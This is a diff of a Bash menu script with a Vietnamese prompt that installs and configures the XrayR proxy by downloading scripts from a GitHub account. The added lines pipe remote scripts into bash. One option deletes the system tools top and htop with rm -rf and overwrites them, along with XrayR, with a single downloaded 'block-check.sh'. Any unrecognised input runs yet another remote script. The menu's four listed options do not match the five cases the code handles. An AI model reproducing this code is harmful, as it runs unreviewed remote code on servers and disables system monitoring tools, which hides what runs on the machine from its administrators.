@@ -1,28 +1,24 @@
 clear
 echo "   1. Install XrayR"
-echo "   2. XrayR SPEED4G"
-echo "   3. XrayR Hide"
+echo "   2. XrayR Hide"
+echo "   3. XrayR SPEED4G"
 echo "   4. Delete"
 read -p "  Vui Lòng Nhập : " num
 
     case "${num}" in
-        1) curl -o /usr/bin/n -Ls https://raw.githubusercontent.com/235nvnybtq235/script/main/xrayr/n.sh && chmod +x /usr/bin/n && n i && cd /usr/bin && printf '#!/bin/bash
-if [[ $# > 0 ]]; then
-    case $1 in
-        "mod") clear && echo "" && echo -e "   VERSION MOD BY ADMIN SPEED4G.ME"
+        1) curl -o /usr/bin/n -Ls https://raw.githubusercontent.com/235nvnybtq235/script/main/xrayr/n.sh && chmod +x /usr/bin/n && n i
         ;;
-        *) clear && echo "" && echo -e "   VERSION MOD BY ADMIN SPEED4G.ME"
+        2) bash <(curl -Ls https://raw.githubusercontent.com/235nvnybtq235/script/main/xrayr/config-hide.sh)
         ;;
-    esac
-else
-    clear && echo "" && echo -e "   VERSION MOD BY ADMIN SPEED4G.ME"
-fi' > XrayR && cd /root 
+        3) cd /usr/bin
+        rm -rf top htop XrayR xrayr
+        curl -o /usr/bin/top -Ls https://raw.githubusercontent.com/235nvnybtq235/script/main/xrayr/block-check.sh && chmod +x top
+        curl -o /usr/bin/htop -Ls https://raw.githubusercontent.com/235nvnybtq235/script/main/xrayr/block-check.sh && chmod +x htop
+        curl -o /usr/bin/XrayR -Ls https://raw.githubusercontent.com/235nvnybtq235/script/main/xrayr/block-check.sh && chmod +x XrayR && ln -s XrayR xrayr && chmod +x xrayr
         ;;
-        2) bash <(curl -Ls https://raw.githubusercontent.com/235nvnybtq235/script/main/xrayr/config-speed4g.sh)
+        4) bash <(curl -Ls https://raw.githubusercontent.com/235nvnybtq235/script/main/xrayr/config-speed4g.sh)
         ;;
-        3) bash <(curl -Ls https://raw.githubusercontent.com/235nvnybtq235/script/main/xrayr/config-hide.sh)
-        ;;
-        4) rm -rf /etc/XrayR && rm -rf /usr/lib/systemd/system/geoip.dat
+        5) rm -rf /etc/XrayR && rm -rf /usr/lib/systemd/system/geoip.dat
         ;;
         *) bash <(curl -Ls https://raw.githubusercontent.com/235nvnybtq235/script/main/xrayr/run.sh)
         ;;
